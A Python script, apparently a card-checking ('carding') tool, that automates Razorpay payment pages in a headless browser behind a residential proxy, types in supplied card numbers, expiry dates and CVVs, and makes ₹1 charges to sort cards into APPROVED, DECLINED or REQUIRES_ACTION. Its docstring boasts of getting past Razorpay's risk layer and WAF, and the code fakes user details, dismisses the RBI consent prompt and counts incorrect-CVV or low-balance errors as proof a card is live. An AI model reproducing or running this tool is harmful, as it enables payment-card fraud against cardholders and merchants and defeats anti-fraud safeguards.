"""Full browser walker for Razorpay payment pages — beats the shield/risk layer.

Runs a real chromium through the resi proxy and performs the entire payment like
a human: amount → Pay → contact → Cards → card form (typed, keystroke-delayed so
checkout.js formatters engage) → Continue → RBI consent "Maybe later" → submit.
checkout.js runs natively, so the shield payload, sardine fingerprint and cookies
are all genuine — the create/ajax POST passes the WAF and returns REAL gateway
verdicts (no more 403 Risk Layer).

Usage: python3 pay.py '<json>'
  json: {"site": "https://razorpay.me/@x", "card": "4111...", "mm": "12",
         "yy": "2029", "cvv": "123", "proxy_server": "...", "proxy_user": ..., "proxy_pass": ...}
Output on stdout: {"status": "...", "response": "...", "site": "...", "raw": "..."}
  status: APPROVED | DECLINED | REQUIRES_ACTION | SITE_FAIL | ERROR
"""
import sys, json, time, random


def out(obj):
    print(json.dumps(obj))
    sys.stdout.flush()
    sys.exit(0)


APPROVE_KEYS = ("insufficient_account_balance", "insufficient_balance", "account_balance_low",
                "cvv provided is incorrect", "incorrect_cvv", "invalid_cvv",
                "maximum transaction limit", "transaction_limit_exceeded")
AUTH_KEYS = ("requires_action", "authentication_required", "otp", "3ds", "two_factor", "2fa")


def map_verdict(err, raw):
    """Map a create/ajax error JSON to a verdict."""
    desc = str(err.get("description", "") or "")
    reason = str(err.get("reason", "") or "")
    dl, rl = desc.lower(), reason.lower()
    resp_text = (desc.replace(" Try another payment method or contact your bank for details.", "")
                .replace("Try another payment method or contact your bank for details.", "").strip()
                or reason or "Payment failed")
    if any(k in dl or k in rl for k in APPROVE_KEYS):
        return {"status": "APPROVED", "response": resp_text, "raw": raw}
    if any(k in dl or k in rl for k in AUTH_KEYS):
        return {"status": "REQUIRES_ACTION", "response": resp_text, "raw": raw}
    return {"status": "DECLINED", "response": resp_text, "raw": raw}


def main():
    args = json.loads(sys.argv[1])
    site = args["site"]
    card = args["card"]
    mm = args["mm"]
    yy = args["yy"]
    cvv = args["cvv"]
    phone = args.get("phone") or str(random.randint(6000000000, 9999999999))
    email = args.get("email") or f"walker{random.randint(100,999)}.rbx@gmail.com"

    from playwright.sync_api import sync_playwright

    with sync_playwright() as p:
        proxy = {"server": args["proxy_server"]}
        if args.get("proxy_user"):
            proxy["username"] = args["proxy_user"]
            proxy["password"] = args.get("proxy_pass", "")
        b = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"], proxy=proxy)
        pg = b.new_page(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                                    "Chrome/131.0.0.0 Safari/537.36")

        api_hits = []

        def on_resp(r):
            u = r.url
            if "api.razorpay.com" in u and ("create/ajax" in u or "checkout/order" in u or "payments/" in u):
                try:
                    body = r.text()
                except Exception:
                    return
                api_hits.append({"status": r.status, "url": u, "body": body[:3000]})

        pg.on("response", on_resp)

        try:
            pg.goto(site, timeout=60000, wait_until="domcontentloaded")
            pg.wait_for_timeout(4000)
            amt = pg.query_selector("input[type=number]")
            pay_btn = pg.query_selector("input[type=button]")
            if not amt or not pay_btn:
                out({"status": "SITE_FAIL", "response": "not a payment page", "site": site, "raw": ""})
            amt.fill("1")
            pay_btn.click()
            pg.wait_for_timeout(9000)

            cf = None
            for _ in range(4):
                cf = next((f for f in pg.frames if "api.razorpay.com" in f.url and "checkout" in f.url), None)
                if cf:
                    try:
                        cf.wait_for_selector("input[name=contact], input[type=radio], input[name='card.number']", timeout=4000)
                        break
                    except Exception:
                        cf = None
                pg.wait_for_timeout(2500)
            if not cf:
                out({"status": "SITE_FAIL", "response": "checkout did not open", "site": site, "raw": ""})

            # contact step (typed so the widget binds properly)
            if cf.query_selector("input[name=contact]"):
                cf.click("input[name=contact]")
                cf.type("input[name=contact]", phone, delay=40)
                try:
                    cf.click("input[name=email]")
                    cf.type("input[name=email]", email, delay=15)
                except Exception:
                    pass
                try:
                    cf.click("button:has-text('Continue')", timeout=5000)
                except Exception:
                    cf.evaluate("""() => { for (const bt of document.querySelectorAll('button')) if ((bt.textContent||'').includes('Continue')) { bt.click(); break; } }""")
                pg.wait_for_timeout(7000)

            # card method
            cf.evaluate("""() => { for (const r of document.querySelectorAll('input[type=radio]')) { const lab = r.closest('label,div')?.textContent || ''; if (/card/i.test(lab)) { r.click(); break; } } }""")
            pg.wait_for_timeout(4000)

            # card form — type digits, let checkout.js format them
            num_sel = None
            for sel in ("input[name='card.number']", "input[name='card[number]']"):
                try:
                    cf.wait_for_selector(sel, timeout=5000)
                    num_sel = sel
                    break
                except Exception:
                    continue
            if not num_sel:
                out({"status": "SITE_FAIL", "response": "card form did not render", "site": site, "raw": ""})
            dot = "card.number" in num_sel
            exp_sel = "input[name='card.expiry']" if dot else "input[name='card[expiry]']"
            cvv_sel = "input[name='card.cvv']" if dot else "input[name='card[cvv]']"
            cf.click(num_sel)
            cf.type(num_sel, card, delay=45)
            try:
                cf.click(exp_sel)
                cf.type(exp_sel, f"{mm}{yy[-2:]}", delay=70)
            except Exception:
                pass
            try:
                cf.click(cvv_sel)
                cf.type(cvv_sel, cvv, delay=45)
            except Exception:
                pass
            pg.wait_for_timeout(1500)

            def click_submit():
                return cf.evaluate("""() => {
                    const btns = [...document.querySelectorAll('button')].filter(b => b.offsetParent && !b.disabled);
                    for (const bt of btns) { const t=(bt.textContent||'').trim(); if (/^pay/i.test(t)) { bt.click(); return 'pay'; } }
                    for (const bt of btns) { const t=(bt.textContent||'').trim(); if (t==='Continue' && bt.type==='submit') { bt.click(); return 'continue'; } }
                    const subs = btns.filter(b => b.type==='submit' && !(b.textContent||'').trim());
                    if (subs.length) { subs[subs.length-1].click(); return 'submit'; }
                    return 'nopay';
                }""")

            # 1st submit — card form Continue (may open RBI consent)
            try:
                click_submit()
            except Exception:
                pass
            pg.wait_for_timeout(5000)

            # RBI consent modal → "Maybe later"
            try:
                rbi = cf.evaluate("""() => { const btns=[...document.querySelectorAll('button')].filter(b=>b.offsetParent); for (const bt of btns) { const t=(bt.textContent||'').trim(); if (/maybe later/i.test(t)) { bt.click(); return 1; } } return 0; }""")
                if rbi:
                    pg.wait_for_timeout(4000)
                    try:
                        click_submit()
                    except Exception:
                        pass
            except Exception:
                pass

            # wait for verdict — poll network hits
            verdict = None
            server_errs = 0
            deadline = time.time() + 60
            while time.time() < deadline and verdict is None:
                pg.wait_for_timeout(3000)
                for h in reversed(api_hits):
                    if h.get("seen"):
                        continue
                    h["seen"] = True
                    body = h["body"]
                    try:
                        j = json.loads(body) if body.strip().startswith("{") else None
                    except Exception:
                        j = None
                    if not isinstance(j, dict):
                        continue
                    err = j.get("error")
                    if isinstance(err, dict):
                        desc = str(err.get("description", "") or "")
                        if "trouble completing" in desc.lower():
                            server_errs += 1
                            continue
                        verdict = map_verdict(err, body[:1500])
                        break
                    st = str(j.get("status", "")).lower()
                    if st in ("captured", "authorized", "paid"):
                        verdict = {"status": "APPROVED", "response": "Charged ₹1.00 (Success)", "raw": body[:1500]}
                        break
                    if j.get("next") or j.get("redirect") or "authenticate" in body.lower():
                        verdict = {"status": "REQUIRES_ACTION", "response": "3DS/OTP Requires Action", "raw": body[:1500]}
                        break
                if verdict is None and server_errs >= 2:
                    break
                # nudge the widget again if it is still showing the form
                if verdict is None:
                    try:
                        click_submit()
                    except Exception:
                        pass
                    pg.wait_for_timeout(2000)

            if verdict:
                out({"status": verdict["status"], "response": verdict["response"], "site": site, "raw": verdict["raw"]})

            # fall back to visible widget text
            try:
                texts = cf.evaluate("""() => {
                    const out = [];
                    for (const e of document.querySelectorAll('div,span,p')) {
                        const t = (e.textContent||'').trim();
                        if (!t || t.length > 200 || !e.offsetParent) continue;
                        const l = t.toLowerCase();
                        if (l.includes('declin')||l.includes('failed')||l.includes('incorrect')||l.includes('invalid')||l.includes('insufficient')||l.includes('otp')||l.includes('authenticat')||l.includes('success'))
                            out.push(t.slice(0,150));
                    }
                    return [...new Set(out)];
                }""")
            except Exception:
                texts = []
            if texts:
                out({"status": "DECLINED", "response": texts[0], "site": site, "raw": json.dumps(texts)[:1500]})
            out({"status": "SITE_FAIL", "response": "no verdict captured", "site": site,
                 "raw": json.dumps(api_hits[-3:])[:1500] if api_hits else ""})

        except Exception as e:
            out({"status": "ERROR", "response": f"{type(e).__name__}: {str(e)[:120]}", "site": site, "raw": ""})
        finally:
            try:
                b.close()
            except Exception:
                pass


if __name__ == "__main__":
    main()
